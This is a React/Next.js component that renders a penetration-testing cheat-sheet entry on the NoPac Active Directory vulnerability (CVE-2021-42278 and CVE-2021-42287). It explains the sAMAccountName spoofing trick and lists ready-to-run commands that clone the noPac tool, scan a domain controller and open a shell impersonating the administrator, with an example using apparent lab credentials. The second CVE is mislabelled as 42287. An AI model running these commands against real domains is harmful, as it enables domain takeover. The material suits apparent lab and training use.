import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const NoPac = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              NoPac, also reffered to as `SamAccountName Spoofing` is a
              vulnerability made up by two CVEs `CVE-2021-42278` and
              `CVE-2021-42287`, allowing for a standard domain user to escalate
              privileges to domain admin.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              This exploit occurs by changing the SamAccountName of a computer
              (`DC1`) to a name similar to the SamAccountName of the Domain
              Controller (`DC1$`). Once done, we can request a TGT from our
              computer (`DC1`) and then rename our computer to something other
              than `DC1` and then request a TGS. When processing the TGS
              request, the KDC will fail to lookup for the requestor machine
              `DC1` (since we renamed it after requesting the TGT) and the KDC
              will perform another lookup appending a trailing $. The KDC lookup
              will succeed. As a result, the KDC will issue the ticket using the
              privileges of `DC1$`
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              CVE-2021-42287 - In case a TGS was requested for an account that
              could not be found, the KDC will attempt to search it again with a
              trailing \$.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              CVE-2021-42287 - A normal user has permission to modify a machine
              account (up to 10 machines) and as its owner, they also have the
              permissions to edit its sAMAccountName.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              For more information see this article:
              https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Clone this repository and make sure impacket is installed
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/Ridter/noPac"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"pip install impacket"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              There's a script called `scanner.py` in the `NoPac` repository
              that we will use to check if the machine is vulnerable to `NoPac`.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "python3 scanner.py {DOMAIN}/{USER}:{PASSWORD} -dc-ip {IP} -use-ldap"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Use the `noPac.py` script ti get a semi-interactive shell session
              established on the taget using `smbexec.py`.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo python3 noPac.py {DOMAIN}/{USER}:{PASSWORD} -dc-ip {IP}  -dc-host {DC_HOSTNAME} -shell --impersonate administrator -use-ldap"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <Typography>Example</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default NoPac;
